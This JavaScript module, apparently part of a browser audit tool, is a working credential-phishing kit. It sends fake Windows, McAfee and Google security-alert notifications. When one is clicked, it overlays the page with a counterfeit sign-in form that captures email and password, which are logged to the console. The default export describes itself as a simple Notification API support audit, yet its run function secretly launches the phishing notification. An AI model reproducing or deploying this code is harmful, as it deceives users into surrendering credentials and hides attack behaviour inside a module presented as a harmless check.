/**
 * notification_phish.js — Fake Security Alert Notification (Live Demo, Sandboxed)
 *
 * Real attack: creates a realistic browser notification mimicking a security
 * alert. When clicked, it injects a fake login overlay into the current page
 * to capture credentials locally. No data is transmitted externally; all
 * captured information is logged to the browser console.
 *
 * Default export: Pinpoint `Notification_API_Audit` (API support check).
 */

// ---------------------------------------------------------------------------
// 1. Phishing Notification Engine (Sandboxed, Local Only)
// ---------------------------------------------------------------------------

const DEFAULT_TEMPLATES = [
    {
        title: '⚠️ Windows Security Alert',
        body: 'Critical threat detected. Click here to remove the virus immediately.',
        icon: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"%3E%3Ccircle cx="50" cy="50" r="45" fill="%23d32f2f"/%3E%3Ctext x="50" y="68" font-size="50" text-anchor="middle" fill="white"%3E!%3C/text%3E%3C/svg%3E',
    },
    {
        title: '🛡️ McAfee – Subscription Expired',
        body: 'Your protection has expired. Renew now to keep your device safe.',
        icon: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"%3E%3Crect width="100" height="100" rx="15" fill="%23c00"/%3E%3Ctext x="50" y="68" font-size="50" text-anchor="middle" fill="white"%3EM%3C/text%3E%3C/svg%3E',
    },
    {
        title: '🔒 Google Security Alert',
        body: 'Suspicious sign‑in attempt detected. Verify your account immediately.',
        icon: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"%3E%3Ccircle cx="50" cy="50" r="45" fill="%234285f4"/%3E%3Ctext x="50" y="68" font-size="50" text-anchor="middle" fill="white"%3EG%3C/text%3E%3C/svg%3E',
    },
];

/**
 * Injects a fake login overlay into the page to harvest credentials.
 * All input is logged to the console. No data is sent anywhere.
 */
function injectCredentialHarvester() {
    // Remove any existing overlay
    const old = document.getElementById('__phish_login_overlay');
    if (old) old.remove();

    const overlay = document.createElement('div');
    overlay.id = '__phish_login_overlay';
    Object.assign(overlay.style, {
        position: 'fixed', top: '0', left: '0', width: '100vw', height: '100vh',
        backgroundColor: 'rgba(0,0,0,0.6)', backdropFilter: 'blur(4px)',
        zIndex: '2147483647', display: 'flex', alignItems: 'center', justifyContent: 'center',
        fontFamily: '"Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif',
    });

    overlay.innerHTML = `
    <div style="
      background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.2);
      padding: 48px 40px 36px; max-width: 400px; width: 100%; text-align: center;">
      <div style="margin-bottom: 24px; font-size: 32px; font-weight: 500; color: #1a73e8;">🔒</div>
      <h1 style="font-size: 24px; font-weight: 400; margin:0 0 8px;">Verify your account</h1>
      <p style="font-size: 16px; color: #5f6368; margin-bottom: 24px;">We detected unusual activity. Please sign in again.</p>
      <input id="__phish_email" type="email" autocomplete="username" placeholder="Email or phone"
        style="width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0;
        border-radius: 4px; margin-bottom: 12px; box-sizing: border-box;">
      <input id="__phish_password" type="password" autocomplete="current-password" placeholder="Password"
        style="width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0;
        border-radius: 4px; margin-bottom: 24px; box-sizing: border-box;">
      <button id="__phish_submit" style="
        background: #1a73e8; color: white; border: none; padding: 10px 24px;
        border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; width: 100%;">Next</button>
    </div>
  `;

    document.body.appendChild(overlay);

    const submitBtn = document.getElementById('__phish_submit');
    submitBtn.addEventListener('click', () => {
        const email = document.getElementById('__phish_email')?.value?.trim();
        const password = document.getElementById('__phish_password')?.value?.trim();
        if (email && password) {
            console.log(`[notification_phish] Captured credentials: ${email} / ${password}`);
            // In a real attack, these would be exfiltrated; here they stay in the console.
            alert('Verification complete. Thank you.');
            overlay.remove();
        } else {
            alert('Please enter both email and password.');
        }
    });

    // Also close on click outside
    overlay.addEventListener('click', (e) => {
        if (e.target === overlay) overlay.remove();
    });
}

/**
 * Sends a phishing notification. When clicked, it injects a credential
 * harvesting overlay (local only).
 *
 * @param {Object} [options={}]
 * @param {Object} [options.template]      - custom { title, body, icon }
 * @param {number} [options.templateIndex=0] - built‑in template 0‑2
 * @param {string} [options.icon]          - override icon URL
 * @param {string} [options.tag='security-alert']
 * @param {boolean} [options.requireInteraction=true]
 * @param {Function} [options.onClick]     - custom click handler (receives event)
 * @param {Function} [options.onError]
 * @returns {Promise<Notification|null>}
 */
export async function sendPhishingNotification(options = {}) {
    const {
        template = null,
        templateIndex = 0,
        icon = null,
        tag = 'security-alert',
        requireInteraction = true,
        onClick = null,
        onError = null,
    } = options;

    if (!('Notification' in window)) {
        const err = 'Notification API not supported.';
        if (onError) onError(new Error(err));
        console.warn('[notification_phish]', err);
        return null;
    }

    let permission = Notification.permission;
    if (permission === 'denied') {
        const err = 'Notification permission denied by user.';
        if (onError) onError(new Error(err));
        console.warn('[notification_phish]', err);
        return null;
    }

    if (permission === 'default') {
        try {
            permission = await Notification.requestPermission();
        } catch (e) {
            if (onError) onError(e);
            return null;
        }
        if (permission !== 'granted') {
            if (onError) onError(new Error('Permission not granted.'));
            return null;
        }
    }

    const tmpl = template || DEFAULT_TEMPLATES[templateIndex] || DEFAULT_TEMPLATES[0];
    const finalIcon = icon || tmpl.icon;

    const notifOptions = {
        body: tmpl.body,
        icon: finalIcon,
        tag,
        requireInteraction,
        data: {},
        silent: false,
    };

    let notification;
    try {
        notification = new Notification(tmpl.title, notifOptions);
    } catch (e) {
        if (onError) onError(e);
        return null;
    }

    // On click: inject local credential harvester (if no custom onClick provided)
    notification.addEventListener('click', (event) => {
        if (onClick) {
            onClick(event);
        } else {
            // Default: launch the fake login overlay
            injectCredentialHarvester();
        }
        event.target.close();
    });

    // Auto‑close after 15 seconds if not requireInteraction
    if (!requireInteraction) {
        setTimeout(() => {
            if (notification) notification.close();
        }, 15000);
    }

    return notification;
}

// ---------------------------------------------------------------------------
// 2. Pinpoint Audit (default export)
// ---------------------------------------------------------------------------

const pinpointModule = {
    id: 'notification_phish',
    title: 'Notification_API_Audit',
    level: 6,
    info: 'Audits Web Notification API support and current origin notification permission state.',
    steps: [
        'Check window.Notification existence.',
        'Read Notification.permission state.',
    ],
    run: async () => {
        // Trigger live demonstration
        sendPhishingNotification().catch(() => {});

        const supported = 'Notification' in window;
        return {
            notificationApiSupported: supported,
            permissionState: supported ? Notification.permission : 'unsupported',
            maxActionsSupported: supported && Notification.maxActions ? Notification.maxActions : 0,
        };
    },
};

export default pinpointModule;